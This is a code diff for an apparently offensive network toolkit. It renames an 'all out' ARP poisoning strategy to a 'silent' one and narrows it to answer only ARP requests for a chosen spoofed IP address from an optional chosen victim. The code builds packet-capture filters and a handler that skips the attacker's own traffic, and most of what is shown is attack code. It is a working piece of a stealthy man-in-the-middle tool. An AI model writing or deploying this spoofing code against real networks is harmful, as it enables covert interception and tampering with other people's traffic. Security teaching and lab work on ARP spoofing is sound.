@@ -1,7 +1,7 @@
-#include "arp_poisoning/all_out.h"
+#include "arp_poisoning/silent.h"
 #include "ArpLayer.h"
 #include "EthLayer.h"
-#include "MacAddress.h"
+#include "Packet.h"
 #include "PcapFilter.h"
 #include "PcapLiveDevice.h"
 #include "RawPacket.h"
@@ -9,7 +9,7 @@
 #include <future>
 #include <stdexcept>
 
-void ATK::ARP::AllOutArpPoisoningStrategy::onPacketArrives(
+void ATK::ARP::SilentArpPoisoningStrategy::onPacketArrives(
     pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void * /*cookie*/) {
     // currently unused, no termination condition
     // auto *completionFuture = static_cast<std::promise<void> *>(cookie);
@@ -19,16 +19,21 @@ void ATK::ARP::AllOutArpPoisoningStrategy::onPacketArrives(
     auto *requestArpLayer = parsedPacket.getLayerOfType<pcpp::ArpLayer>();
 
     if (requestEthLayer == nullptr || requestArpLayer == nullptr) {
+        device->stopCapture();
+        device->close();
         LOG_ERROR(
-            "Invalid filter configuration, foudn packet with missing layers");
+            "Inavlid filter configuration, found packets wiht missing layers");
         throw std::runtime_error(
-            "Invalid filter configuration, found packet with missing layers");
+            "Invalid filter settings, found packet with missing layers");
     }
 
     // determine whether or not to handle packet
     if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
          requestEthLayer->getSourceMac() == attackerMac_) ||
-        requestArpLayer->getTargetIpAddr() != device->getIPv4Address()) {
+        (requestArpLayer->getTargetIpAddr() != ipToSpoof_ ||
+         requestArpLayer->getTargetIpAddr() == device->getIPv4Address()) ||
+        (victimIp_.has_value() &&
+         requestArpLayer->getSenderIpAddr() != victimIp_.value())) {
         LOG_INFO("skipped packet");
         return;
     }
@@ -53,16 +58,18 @@ void ATK::ARP::AllOutArpPoisoningStrategy::onPacketArrives(
     };
 }
 
-void ATK::ARP::AllOutArpPoisoningStrategy::execute() {
+void ATK::ARP::SilentArpPoisoningStrategy::execute() {
     if (!device_->open()) {
-        throw std::runtime_error("Unable to open device");
+        throw std::runtime_error("Unable to open interface");
     }
-    std::promise<void> completionPromise;
-    std::future completionFuture = completionPromise.get_future();
 
+    std::promise<void> completionPromise;
+    std::future<void> completionFuture = completionPromise.get_future();
+
+    // set filters
     pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
     pcpp::EtherTypeFilter etherTypeFilter(PCPP_ETHERTYPE_ARP);
-    pcpp::AndFilter andFilter{};
+    pcpp::AndFilter andFilter;
     andFilter.addFilter(&arpFilter);
     andFilter.addFilter(&etherTypeFilter);
 
@@ -82,6 +89,8 @@ void ATK::ARP::AllOutArpPoisoningStrategy::execute() {
         LOG_ERROR("Unable to start capturing arp packets");
         throw std::runtime_error("Unable to start capturing arp packets");
     };
+
+    completionFuture.wait();
 
     device_->close();
 }
